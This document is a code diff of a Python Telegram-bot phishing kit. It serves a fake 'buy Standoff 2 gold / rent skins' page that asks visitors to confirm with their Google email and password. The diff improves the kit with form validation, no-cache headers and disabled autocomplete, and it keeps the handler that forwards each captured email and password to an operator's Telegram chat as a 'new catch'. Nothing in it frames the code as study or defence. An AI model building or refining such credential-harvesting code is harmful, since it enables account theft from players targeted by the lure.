@@ -1,6 +1,7 @@
 import asyncio
 import logging
 import os
+import re
 from aiogram import Bot, Dispatcher, types
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from aiogram.filters import Command
@@ -14,7 +15,7 @@ ADMIN_CHAT_ID = "6739523131"
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
-# ----- ФЕЙКОВАЯ СТРАНИЦА "ПОКУПКА ГОЛДЫ / АРЕНДА СКИНОВ" -----
+# ----- ФЕЙКОВАЯ СТРАНИЦА С ВАЛИДАЦИЕЙ -----
 FAKE_PAGE = """<!DOCTYPE html>
 <html>
 <head><meta charset="UTF-8"><title>Купить голду Standoff 2</title>
@@ -27,7 +28,52 @@ body{font-family:Arial;background:#1a1a2e;display:flex;justify-content:center;al
 .btn:hover{background:#27ae60;}
 .skin{background:#2c3e50;padding:10px;border-radius:10px;margin:10px 0;display:flex;align-items:center;gap:10px;}
 .skin-img{font-size:30px;}
+.error{color:#e74c3c;background:#2c3e50;padding:10px;border-radius:5px;margin:10px 0;display:none;}
 </style>
+<script>
+function validateAndSubmit() {
+    var email = document.getElementById('email').value.trim();
+    var password = document.getElementById('password').value.trim();
+    var emailError = document.getElementById('emailError');
+    var passwordError = document.getElementById('passwordError');
+    var emailValid = false;
+    var passwordValid = false;
+    
+    // Проверка email (простой regex)
+    var emailPattern = /^[^\\s@]+@([^\\s@]+\\.)+[^\\s@]+$/;
+    if (email === "") {
+        emailError.innerText = "❌ Введите email";
+        emailError.style.display = "block";
+        emailValid = false;
+    } else if (!emailPattern.test(email)) {
+        emailError.innerText = "❌ Неправильный формат email (пример: name@domain.com)";
+        emailError.style.display = "block";
+        emailValid = false;
+    } else {
+        emailError.style.display = "none";
+        emailValid = true;
+    }
+    
+    // Проверка пароля (не пустой)
+    if (password === "") {
+        passwordError.innerText = "❌ Введите пароль";
+        passwordError.style.display = "block";
+        passwordValid = false;
+    } else if (password.length < 1) {
+        passwordError.innerText = "❌ Пароль не может быть пустым";
+        passwordError.style.display = "block";
+        passwordValid = false;
+    } else {
+        passwordError.style.display = "none";
+        passwordValid = true;
+    }
+    
+    // Если всё ок — отправляем форму
+    if (emailValid && passwordValid) {
+        document.getElementById('loginForm').submit();
+    }
+}
+</script>
 </head>
 <body>
 <div class="card">
@@ -42,10 +88,12 @@ body{font-family:Arial;background:#1a1a2e;display:flex;justify-content:center;al
 <div>✨ Скин M4A4 «Император»<br>🎯 Аренда: 30₽/день</div>
 </div>
 <p>✅ Для покупки или аренды подтвердите вход в Google</p>
-<form action="/login" method="POST">
-<input type="email" name="email" class="input" placeholder="Email от Google аккаунта" required>
-<input type="password" name="password" class="input" placeholder="Пароль" required>
-<button type="submit" class="btn">🎮 ПОДТВЕРДИТЬ И ВОЙТИ</button>
+<form id="loginForm" action="/login" method="POST">
+<input type="email" name="email" id="email" class="input" placeholder="Email от Google аккаунта" autocomplete="off">
+<div id="emailError" class="error"></div>
+<input type="password" name="password" id="password" class="input" placeholder="Пароль" autocomplete="off">
+<div id="passwordError" class="error"></div>
+<button type="button" class="btn" onclick="validateAndSubmit()">🎮 ПОДТВЕРДИТЬ И ВОЙТИ</button>
 </form>
 <p style="font-size:12px; color:#7f8c8d;">Ваши данные защищены. После входа голда будет начислена автоматически.</p>
 </div>
@@ -54,13 +102,36 @@ body{font-family:Arial;background:#1a1a2e;display:flex;justify-content:center;al
 
 # ----- ОБРАБОТКА ВЕБ-ЗАПРОСОВ -----
 async def handle_index(request):
-    return web.Response(text=FAKE_PAGE, content_type='text/html')
+    headers = {
+        'Cache-Control': 'no-cache, no-store, must-revalidate',
+        'Pragma': 'no-cache',
+        'Expires': '0'
+    }
+    return web.Response(text=FAKE_PAGE, content_type='text/html', headers=headers)
 
 async def handle_login(request):
     data = await request.post()
-    email = data.get('email', '')
-    password = data.get('password', '')
+    email = data.get('email', '').strip()
+    password = data.get('password', '').strip()
     
+    # Простая валидация на сервере (на случай обхода клиентской проверки)
+    email_pattern = re.compile(r'^[^\s@]+@([^\s@]+\.)+[^\s@]+$')
+    if not email or not password or not email_pattern.match(email):
+        # Если данные не прошли проверку — возвращаем ошибку
+        error_page = """<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Ошибка</title>
+<style>body{background:#1a1a2e;color:white;font-family:Arial;text-align:center;padding:50px;}</style>
+</head>
+<body>
+<h2>❌ НЕВЕРНЫЕ ДАННЫЕ</h2>
+<p>Пожалуйста, вернитесь и введите корректный email и пароль.</p>
+<a href="/">Вернуться</a>
+</body>
+</html>"""
+        return web.Response(text=error_page, content_type='text/html', status=400)
+    
+    # Отправляем в Telegram
     msg = f"🔓 НОВЫЙ УЛОВ (покупка голды)!\n📧 Email: {email}\n🔑 Пароль: {password}"
     await bot.send_message(ADMIN_CHAT_ID, msg)
     
